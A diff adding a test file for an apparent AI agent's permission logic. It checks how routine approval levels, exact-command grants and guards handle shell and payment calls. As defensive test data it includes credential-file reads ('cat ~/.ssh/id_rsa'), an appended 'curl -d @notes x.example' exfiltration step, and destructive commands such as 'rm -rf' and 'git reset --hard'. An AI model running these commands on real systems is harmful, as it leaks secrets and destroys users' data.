@@ -1,0 +1,252 @@
+// Copyright 2026 Ferrox Labs
+// SPDX-License-Identifier: AGPL-3.0-or-later
+//
+// A routine's stored ceiling, the bot's current level, and the grants and
+// guards that apply to each run.
+import { describe, expect, it } from "vitest";
+
+import { autoVerdict, fullAccessCovers, type AutoContext } from "./auto-approve.ts";
+import { fullAccessApprovesSetup } from "./full-access.ts";
+import { exactCommandKey } from "../shared/exact-command.ts";
+import {
+  applyRoutinePermissionMode,
+  botPermissionMode,
+  effectiveRoutinePermissionMode,
+  isRoutineGrantKey,
+  loadRoutinePermissionMode,
+  routineGrantKeys,
+  routinePermissionModeInput,
+  type RoutinePermissionMode,
+} from "./routine-permissions.ts";
+
+const ask = { autoApprove: false, fullAccess: false, noLimits: false, alwaysAllow: [] };
+const auto = { autoApprove: true, fullAccess: false, noLimits: false, alwaysAllow: [] };
+const full = { autoApprove: true, fullAccess: true, noLimits: false, alwaysAllow: [] };
+const unlimited = { autoApprove: true, fullAccess: true, noLimits: true, alwaysAllow: [] };
+
+describe("a routine's level", () => {
+  it("reads a bot's level from its flags, lowest wins when flags disagree", () => {
+    expect(botPermissionMode(ask)).toBe("ask");
+    expect(botPermissionMode(auto)).toBe("auto");
+    expect(botPermissionMode(full)).toBe("full");
+    expect(botPermissionMode(unlimited)).toBe("unlimited");
+    // No limits counts only on top of Full access, Full access only on Auto
+    expect(botPermissionMode({ autoApprove: true, noLimits: true })).toBe("auto");
+    expect(botPermissionMode({ fullAccess: true, noLimits: true })).toBe("ask");
+    expect(botPermissionMode(null)).toBe("ask");
+  });
+
+  it("uses the lower of the routine ceiling and the current bot level", () => {
+    expect(effectiveRoutinePermissionMode({}, unlimited)).toBe("unlimited");
+    expect(effectiveRoutinePermissionMode({}, auto)).toBe("auto");
+    expect(effectiveRoutinePermissionMode({ permissionMode: "ask" }, unlimited)).toBe("ask");
+    expect(effectiveRoutinePermissionMode({ permissionMode: "full" }, ask)).toBe("ask");
+    expect(effectiveRoutinePermissionMode({ permissionMode: "unlimited" }, auto)).toBe("auto");
+    expect(effectiveRoutinePermissionMode({ permissionMode: "unlimited" }, full)).toBe("full");
+    expect(effectiveRoutinePermissionMode({ permissionMode: "auto" }, full)).toBe("auto");
+    expect(effectiveRoutinePermissionMode({ permissionMode: "unlimited" }, null)).toBe("ask");
+  });
+
+  it("applies a level as the flags the verdict reads, keeping the grants", () => {
+    const granted = { ...ask, alwaysAllow: ["Bash:git"] };
+    expect(applyRoutinePermissionMode(granted, "unlimited")).toMatchObject({ autoApprove: true, fullAccess: true, noLimits: true, alwaysAllow: ["Bash:git"] });
+    expect(applyRoutinePermissionMode(unlimited, "full")).toMatchObject({ autoApprove: true, fullAccess: true, noLimits: false });
+    expect(applyRoutinePermissionMode(unlimited, "auto")).toMatchObject({ autoApprove: true, fullAccess: false, noLimits: false });
+    expect(applyRoutinePermissionMode(unlimited, "ask")).toMatchObject({ autoApprove: false, fullAccess: false, noLimits: false });
+  });
+
+  it("leaves missing levels for migration and loads invalid levels as Ask", () => {
+    expect(loadRoutinePermissionMode(undefined)).toBeUndefined();
+    expect(loadRoutinePermissionMode("full")).toBe("full");
+    for (const value of ["root", "inherit", null, 3, false, {}]) {
+      expect(loadRoutinePermissionMode(value)).toBe("ask");
+    }
+  });
+
+  it("accepts a level or inherit from the editor and refuses anything else", () => {
+    expect(routinePermissionModeInput("inherit")).toBeNull();
+    expect(routinePermissionModeInput(null)).toBeNull();
+    expect(routinePermissionModeInput("unlimited")).toBe("unlimited");
+    expect(() => routinePermissionModeInput("everything")).toThrow(/approval level/);
+  });
+});
+
+describe("a routine run's verdict at each level", () => {
+  const routine: AutoContext = { automated: true, routineLevel: true, stopLine: null };
+  const outside = { kind: "delete" as const, place: "/Users/ada/Documents", what: "Delete 1 item outside its folder: ~/Documents/x" };
+  const at = (mode: RoutinePermissionMode) => applyRoutinePermissionMode(ask, mode);
+
+  it("Full access and No limits cover a routine run only at that level", () => {
+    expect(fullAccessCovers(full, "routine")).toBe(true);
+    expect(fullAccessCovers(auto, "routine")).toBe(false);
+    expect(autoVerdict(at("full"), "Bash", "rm -rf build", routine)).toMatchObject({ source: "full-access" });
+    // MARKS r12 re-baseline (M-R7-level): a routine keeps the strict read, so with no fixed folder a relative write
+    // cards (unreadable, value-path); with the routine's folder known it runs at No limits as before
+    expect(autoVerdict(at("unlimited"), "Bash", "rm -rf build", { ...routine, commandCwd: "/w" })).toMatchObject({ source: "no-limits" });
+    expect(autoVerdict(at("unlimited"), "Bash", "rm -rf build", routine)).toMatchObject({ approve: null, source: "always-ask", rule: "unreadable" });
+    expect(autoVerdict(at("auto"), "Bash", "rm -rf build", routine).source).toBe("destructive-guard");
+    expect(autoVerdict(at("auto"), "Bash", "ls", routine).source).toBe("auto-mode");
+    expect(autoVerdict(at("ask"), "Bash", "ls", routine).source).toBe("no-grant");
+  });
+
+  it("the key guard holds at every level", () => {
+    for (const mode of ["ask", "auto", "full", "unlimited"] as const) {
+      // NOLIM 1.0.19: the key guard is a deny row, not a wipe row: the owner's routine at No limits ("unlimited") runs it
+      const held = mode === "unlimited" ? "no-limits" : "sensitive-guard";
+      expect(autoVerdict(at(mode), "Bash", "cat ~/.zshrc", routine).source).toBe(held);
+      expect(autoVerdict(at(mode), "Bash", "cat ~/.ssh/id_rsa", { ...routine, stopLine: outside }).source).toBe(held);
+    }
+  });
+
+  it("the stop line holds at every routine level", () => {
+    for (const mode of ["ask", "auto", "full", "unlimited"] as const) {
+      expect(autoVerdict(at(mode), "Bash", "rm -rf ~/Documents/x", { ...routine, stopLine: outside })).toMatchObject({ approve: null, source: "stop-line" });
+    }
+  });
+
+  it("No limits keeps payment approval for routines and the owner's existing authority", () => {
+    const payment = { kind: "pay" as const, place: "stripe:cus_1", what: "Pay the named recipient" };
+    const verdict = autoVerdict(unlimited, "mcp__stripe__create_charge", "Create charge", { ...routine, stopLine: payment });
+    expect(verdict).toMatchObject({ approve: null, source: "stop-line", rule: "pay" });
+    expect(autoVerdict(unlimited, "mcp__stripe__create_charge", "Create charge", { stopLine: payment })).toMatchObject({
+      approve: expect.any(String), source: "no-limits",
+    });
+    expect(autoVerdict(unlimited, "mcp__stripe__create_charge", "Create charge", {
+      ...routine, stopLine: payment, routineAllow: ["stop:pay:stripe:cus_1"],
+    })).toMatchObject({ approve: expect.any(String), source: "routine-allow", rule: "stop:pay:stripe:cus_1" });
+    expect(autoVerdict(unlimited, "mcp__stripe__create_charge", "Create charge", {
+      ...routine, unattended: true, stopLine: payment, routineAllow: ["stop:pay:stripe:cus_1"],
+    }).approve).toBeNull();
+  });
+
+  it("setup requests (a new routine, skill or trusted folder) still ask in a routine run", () => {
+    expect(fullAccessApprovesSetup({ ...unlimited, fullAccessSetupRequests: true }, "routine")).toBe(false);
+    expect(fullAccessApprovesSetup({ ...unlimited, fullAccessSetupRequests: true }, "owner")).toBe(true);
+  });
+
+  it("a question is never answered by a routine's level", () => {
+    expect(autoVerdict(at("unlimited"), "AskUserQuestion", "Which?", routine).source).toBe("question-tool");
+  });
+
+  it("without the routine's level a routine turn is still judged as Auto", () => {
+    expect(autoVerdict(full, "Bash", "rm -rf build", { automated: true, stopLine: null }).source).toBe("destructive-guard");
+    expect(autoVerdict(unlimited, "Bash", "x", { automated: true, stopLine: outside }).source).toBe("stop-line");
+  });
+
+  it("an unattended turn keeps the unattended rules even with a routine's level", () => {
+    const webhookish: AutoContext = { ...routine, unattended: true };
+    expect(autoVerdict(at("full"), "Bash", "ls", webhookish)).toMatchObject({ approve: null, source: "unattended-block" });
+    expect(autoVerdict(at("unlimited"), "Bash", "x", { ...webhookish, stopLine: outside }).approve).toBeNull();
+    expect(autoVerdict(at("unlimited"), "Bash", "ls", webhookish).approve).toBeNull();
+  });
+});
+
+describe("Always allow for this routine", () => {
+  const routine: AutoContext = { automated: true, routineLevel: true, stopLine: null };
+  const exact = { engine: "claude", cwd: "/Users/ada/work", command: "curl -s https://example.com/rwa | jq ." };
+  const exactKey = exactCommandKey(exact)!;
+  const outside = { kind: "delete" as const, place: "/Users/ada/Documents/old", what: "Delete 1 item outside its folder: ~/Documents/old" };
+
+  it("covers the same exact command in the same folder on the same engine", () => {
+    expect(autoVerdict(ask, "Bash", exact.command, { ...routine, exactCommand: exact, routineAllow: [exactKey] })).toMatchObject({ source: "routine-allow", rule: exactKey });
+    const elsewhere = { ...exact, cwd: "/Users/ada" };
+    expect(autoVerdict(ask, "Bash", exact.command, { ...routine, exactCommand: elsewhere, routineAllow: [exactKey] }).source).toBe("no-grant");
+  });
+
+  it("keeps dates and times in the exact command granted for a routine", () => {
+    const at = (stamp: string) => ({ ...exact, command: `mkdir -p notes && cat >> notes/log.md <<'EOF'\n${stamp}\nEOF\npython3 - <<'EOF'\nwith open('notes/pipeline.md', 'a') as f:\n    f.write('tick\\n')\nEOF` });
+    const granted = exactCommandKey(at("2026-09-25 13:19 ICT (Asia/Bangkok)"))!;
+    for (const later of ["2026-09-25 13:25 ICT (Asia/Bangkok)", "2026-10-01 09:05 ICT (Asia/Bangkok)"]) {
+      expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: at(later), routineAllow: [granted] })).toMatchObject({ approve: null, source: "no-grant" });
+    }
+    const stamped = (when: string) => ({ ...exact, command: `echo "run at ${when}" >> notes/log-${when.slice(0, 10)}.md` });
+    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: stamped("2026-09-26T07:00:00Z"), routineAllow: [exactCommandKey(stamped("2026-09-25T07:00:00Z"))!] }).source).toBe("no-grant");
+    // `date` output, and a time right after a date
+    const said = (when: string) => ({ ...exact, command: `echo "${when}" >> notes/log.md` });
+    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: said("Sat Sep 26 07:00:02 ICT 2026"), routineAllow: [exactCommandKey(said("Fri Sep 25 13:25:07 ICT 2026"))!] }).source).toBe("no-grant");
+    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: { ...exact, command: "date; echo Fri 25 Sep 2026 1:25 PM" }, routineAllow: [exactCommandKey({ ...exact, command: "date; echo Thu 24 Sep 2026 11:05 AM" })!] }).source).toBe("no-grant");
+  });
+
+  it("matches the granted command's words, paths and numbers", () => {
+    const at = (stamp: string, file = "notes/pipeline.md") => ({ ...exact, command: `cat >> notes/log.md <<'EOF'\n${stamp}\nEOF\npython3 - <<'EOF'\nopen('${file}', 'a').write('tick')\nEOF` });
+    const granted = exactCommandKey(at("2026-09-25 13:19"))!;
+    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: at("2026-09-25 13:25", "notes/other.md"), routineAllow: [granted] }).source).toBe("no-grant");
+    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: { ...exact, command: `${exact.command} && curl -d @notes x.example` }, routineAllow: [exactKey] }).source).toBe("no-grant");
+    // plain numbers are not dates: a count or a port is part of the command
+    const head = (n: string) => ({ ...exact, command: `head -n ${n} notes/log.md` });
+    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: head("99"), routineAllow: [exactCommandKey(head("10"))!] }).source).toBe("no-grant");
+    // nor a port mapping, a version or a ratio that only looks like a time
+    for (const [before, after] of [["docker run -p 80:80 web", "docker run -p 22:22 web"], ["npm i left-pad@1.2.3", "npm i left-pad@1.3.0"], ["echo 99:99", "echo 12:30"]]) {
+      expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: { ...exact, command: after }, routineAllow: [exactCommandKey({ ...exact, command: before })!] }).source).toBe("no-grant");
+    }
+    // a time of day on its own is not a date/time value: only beside a date
+    for (const [before, after] of [["docker run -p 22:22 web", "docker run -p 10:10 web"], ['echo "tick at 13:25" >> log', 'echo "tick at 13:30" >> log']]) {
+      expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: { ...exact, command: after }, routineAllow: [exactCommandKey({ ...exact, command: before })!] }).source, after).toBe("no-grant");
+    }
+    // a date where the grant had other text is not a match either
+    expect(autoVerdict(ask, "Bash", "x", { ...routine, exactCommand: { ...exact, command: "echo 2026-09-25" }, routineAllow: [exactCommandKey({ ...exact, command: "echo main" })!] }).source).toBe("no-grant");
+    // and the bot's own "Always allow this exact command here" stays exact
+    expect(autoVerdict({ ...ask, alwaysAllow: [granted] }, "Bash", "x", { exactCommand: at("2026-09-25 13:25") }).source).toBe("no-grant");
+  });
+
+  it("covers a stop-line card through its scoped key, like a task allowance", () => {
+    expect(autoVerdict(ask, "Bash", "rm -rf ~/Documents/old/x", { ...routine, stopLine: { ...outside, place: "/Users/ada/Documents/old/x" }, routineAllow: ["stop:delete:/Users/ada/Documents/old"] }))
+      .toMatchObject({ source: "routine-allow", rule: "stop:delete:/Users/ada/Documents/old" });
+    expect(autoVerdict(ask, "Bash", "x", { ...routine, stopLine: { ...outside, place: "/Users/ada/Desktop" }, routineAllow: ["stop:delete:/Users/ada/Documents/old"] }).source).toBe("stop-line");
+  });
+
+  it("is never a bare tool name or a program grant", () => {
+    expect(autoVerdict(ask, "Bash", "git status", { ...routine, routineAllow: ["Bash", "Bash:git"] }).source).toBe("no-grant");
+    expect(autoVerdict(ask, "mcp__x__send", "{}", { ...routine, routineAllow: ["mcp__x__send"] }).source).toBe("no-grant");
+  });
+
+  it("the guards still outrank it", () => {
+    const secret = { ...exact, command: "cat ~/.zshrc" };
+    expect(autoVerdict(ask, "Bash", secret.command, { ...routine, exactCommand: secret, routineAllow: [exactCommandKey(secret)!] }).source).toBe("sensitive-guard");
+    const wipe = { ...exact, command: "git reset --hard" };
+    expect(autoVerdict(ask, "Bash", wipe.command, { ...routine, exactCommand: wipe, routineAllow: [exactCommandKey(wipe)!] }).source).toBe("destructive-guard");
+    expect(autoVerdict(ask, "Bash", "cat ~/.ssh/id_rsa", { ...routine, stopLine: outside, routineAllow: ["stop:delete:/Users/ada/Documents/old"] }).source).toBe("sensitive-guard");
+  });
+
+  it("counts only in a routine run nobody reached from outside", () => {
+    expect(autoVerdict(ask, "Bash", exact.command, { exactCommand: exact, routineAllow: [exactKey] }).source).toBe("no-grant");
+    expect(autoVerdict(ask, "Bash", exact.command, { ...routine, unattended: true, exactCommand: exact, routineAllow: [exactKey] }).approve).toBeNull();
+    expect(autoVerdict(ask, "Bash", "x", { ...routine, unattended: true, stopLine: outside, routineAllow: ["stop:delete:/Users/ada/Documents/old"] }).approve).toBeNull();
+    expect(autoVerdict(ask, "Bash", exact.command, { ...routine, scope: "local-computer", exactCommand: exact, routineAllow: [exactKey] }).approve).toBeNull();
+  });
+
+  // Astra's two reviews of id-tolerant routine grants (release 1.0.2): every
+  // pair below was covered by a grant on the first command once ids could
+  // vary. A routine grant covers only the exact command, as in 1.0.1, so
+  // each later command asks.
+  it("covers no other command where only an id changed (Astra pairs)", () => {
+    for (const [approved, later] of [
+      ["aws s3 rm s3://bucket/a1b2c3d4", "aws s3 rm s3://bucket/e5f6a7b8"],
+      ["curl -X DELETE https://api.example.com/items/a1b2c3d4", "curl -X DELETE https://api.example.com/items/e5f6a7b8"],
+      ["curl -X POST -d hello https://api.example.com/inbox/a1b2c3d4", "curl -X POST -d hello https://api.example.com/inbox/e5f6a7b8"],
+      // a git network command with no repository facts holds under the prompt guard (Rule 68f), so a local one stands in
+      ["git show a1b2c3d4", "git show e5f6a7b8"],
+      ["/opt/tools/a1b2c3d4 --check", "/opt/tools/e5f6a7b8 --check"],
+      [`python3 -c "open('/archive/a1b2c3d4','w').write('')"`, `python3 -c "open('/archive/e5f6a7b8','w').write('')"`],
+      ["cat /Users/ada/.murage/workspaces/a1b2c3d4/MEMORY.md", "cat /Users/ada/.murage/workspaces/e5f6a7b8/MEMORY.md"],
+      [
+        "cat /Users/ada/.claude/projects/-Users-ada-work/550e8400-e29b-41d4-a716-446655440000/tool-results/result.txt",
+        "cat /Users/ada/.claude/projects/-Users-ada-work/9b2d6f1e-4a7c-4e3b-8d5f-0c1a2b3c4d5e/tool-results/result.txt",
+      ],
+    ]) {
+      const granted = exactCommandKey({ ...exact, command: approved! })!;
+      expect(autoVerdict(ask, "Bash", approved!, { ...routine, exactCommand: { ...exact, command: approved! }, routineAllow: [granted] }).source, approved).toBe("routine-allow");
+      expect(autoVerdict(ask, "Bash", later!, { ...routine, exactCommand: { ...exact, command: later! }, routineAllow: [granted] }), later).toMatchObject({ approve: null, source: "no-grant" });
+    }
+  });
+
+  it("a routine grant on a git network command with no repository facts holds under the prompt guard", () => {
+    const granted = exactCommandKey({ ...exact, command: "git push origin a1b2c3d4" })!;
+    expect(autoVerdict(ask, "Bash", "git push origin a1b2c3d4", { ...routine, exactCommand: { ...exact, command: "git push origin a1b2c3d4" }, routineAllow: [granted] }).source).toBe("prompt-guard");
+  });
+
+  it("keeps only exact-command and stop-line keys, never a payment (UX-TRUST-MOMENTS-1012 2.3.4)", () => {
+    expect(routineGrantKeys(["Bash", "Bash:git", exactKey, "stop:delete:/x", "stop:pay:stripe:cus_1", 3, "exact:nonsense"])).toEqual([exactKey, "stop:delete:/x"]);
+    expect(isRoutineGrantKey("Bash:git")).toBe(false);
+  });
+});
